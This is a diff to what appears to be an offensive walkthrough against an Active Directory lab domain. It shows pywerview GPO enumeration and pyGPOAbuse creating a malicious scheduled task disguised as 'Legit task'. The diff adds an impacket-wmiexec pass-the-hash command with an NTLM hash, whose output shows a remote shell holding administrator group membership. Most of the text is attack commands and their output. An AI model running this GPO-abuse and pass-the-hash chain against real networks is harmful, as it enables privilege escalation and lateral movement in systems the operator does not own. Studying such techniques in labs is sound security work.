@@ -48,8 +48,6 @@ python3 pywerview.py get-netgpo \
 # cn:                      {D22722CD-4F22-4853-AB0F-FA6F09AB9E50}
 # distinguishedname:       CN={D22722CD-4F22-4853-AB0F-FA6F09AB9E50},CN=Policies,CN=System,DC=sales,DC=contoso,DC=lab
 # instancetype:            4
-# whencreated:             2026-05-05 13:44:58+00:00
-# whenchanged:             2026-05-05 13:44:58+00:00
 # displayname:             Test GPO
 # usncreated:              167712
 # usnchanged:              167717
@@ -78,6 +76,33 @@ python3 pygpoabuse.py 'sales.contoso.lab/lmodifr' \
 -taskname 'Legit task'
 # SUCCESS:root:ScheduledTask Legit task created!
 # [+] ScheduledTask Legit task created!
+
+impacket-wmiexec sales.contoso.lab/lmodifr@192.168.1.200 -hashes ':f28e11d87d14a00396ea087f74e460c5'
+# Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies
+# 
+# [*] SMBv3.0 dialect used
+# [!] Launching semi-interactive shell - Careful what you execute
+# [!] Press help for extra shell commands
+# C:\>whoami /all
+# 
+# USER INFORMATION
+# ----------------
+# 
+# User Name     SID
+# ============= =============================================
+# sales\lmodifr S-1-5-21-1548103905-787397850-1049434999-1116
+# 
+# 
+# GROUP INFORMATION
+# -----------------
+# 
+# Group Name                           Type             SID          Attributes
+# ==================================== ================ ============ ===============================================================
+# Everyone                             Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
+# BUILTIN\Administrators               Alias            S-1-5-32-544 Mandatory group, Enabled by default, Enabled group, Group owner
+# ...
+#
+# C:\>exit
 
 python3 pygpoabuse.py 'sales.contoso.lab/lmodifr' \
 -dc-ip '192.168.1.12' \
